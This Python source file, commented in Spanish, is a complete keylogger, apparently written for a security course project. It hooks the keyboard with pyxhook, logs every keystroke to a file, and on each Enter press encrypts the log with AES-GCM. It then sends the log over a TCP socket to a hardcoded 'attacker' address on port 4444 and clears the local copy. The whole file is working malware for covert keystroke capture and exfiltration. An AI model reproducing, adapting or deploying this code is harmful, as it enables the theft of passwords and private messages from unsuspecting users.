# Libreria que provee funciones para interactuar con el sistema operativo
import os
# Libreria que captura las llamadas del mouse y del teclado en el sistema.
import pyxhook
# Libreria necesaria para codificar y descodificar
from base64 import b64encode, b64decode
# Libreria utilizada para generar la clave secreta 
import hashlib
# Libreria para encriptar el mensaje con AES
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
#Libraria para generar la conexión con el atacante
import socket
# Libraria usada para codificar y descodificar
import json


#Captura el evento de presionar una tecla y escribe en el archivo log.
# ejemplo:
# Si presiona 'enter' se envia el mensaje cifrado al atacante.
# Si presiona 'Back space' (tecla para borrar) escibre en el archivo ' (DEL)'.
# Si presiona 'espacio' o 'Tab' escribe un espacio ' '.
# Si presiona cualquier otra tecla lo escribe una al lado de la otra.
def capturaTeclado(event):
    # abre archivo log 
    file = open(archivoLog, 'a') 

    try:
        # Escribe en el archivo con las diferentes formas mencionadas
        if( event.Key == 'Return'):
            enviarMensaje()
        elif (event.Key == 'BackSpace'): 
            file.write(' (DEL)')
        elif(event.Key == 'space' or event.Key == 'Tab' ):
            file.write(' ')
        else:
            file.write('{}'.format(event.Key))

    finally:
        # cierra el archivo.
        file.close()

# Envia el mensaje cifrado con AES-256 al atacante. 
def enviarMensaje():  
    # abre archivo log
    file = open(archivoLog, "r")
    # transforma el dict que resultado de la encriptación con AES-256, a json y el json a str,
    mensajeEncriptado = json.dumps(encriptar(file.read(), "ProyectoSeguridad")).encode()
    # Envia el mensaje encriptado a traves del socket
    sock.sendall(mensajeEncriptado)
    # cierra el archivo log
    file.close()
    # abre el archivo log para vaciar el contenido.
    file = open(archivoLog, "w")
    # cierra el archivo log
    file.close()


# Encripta el mensaje dado un texto y una contraseña
def encriptar(mensaje, clave):
    # Genera un valor aleatorio dado el numero de bloque del objeto AES (16)
    salt = get_random_bytes(AES.block_size)

    # Genera un clave privada utlizando el scrypt KDF
    clavePrivada = hashlib.scrypt(
        clave.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)

    # configura el cifrado 
    configCifrado = AES.new(clavePrivada, AES.MODE_GCM)

    # Retorna un diccionario con el texto encriptado
    textoCifrado, etiqueta = configCifrado.encrypt_and_digest(bytes(mensaje, 'utf-8'))
    return {
        'textoCifrado': b64encode(textoCifrado).decode('utf-8'),
        'salt': b64encode(salt).decode('utf-8'),
        'nonce': b64encode(configCifrado.nonce).decode('utf-8'),
        'etiqueta': b64encode(etiqueta).decode('utf-8')
    } 


# Indica el directorio del archivo log
archivoLog = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/file.log')
)


# Crea un socket TCP/IP 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# conecta el socket al puerto 4444 y a la ip del atacante
direccionServidor = ('192.168.1.50', 4444)
#print('conectando a {} por el puerto {}'.format(*direccionServidor))
sock.connect(direccionServidor)

# Se define el objecto que maneja las capturas de eventos como mouse o teclado
eventos = pyxhook.HookManager()
# Si se captura el evento de presionar una tecla se llama a la función capturaTeclado()
eventos.KeyDown = capturaTeclado
# Configura el objecto como un capturador de evento de teclado
eventos.HookKeyboard()
# Inicia la captura 
eventos.start()  
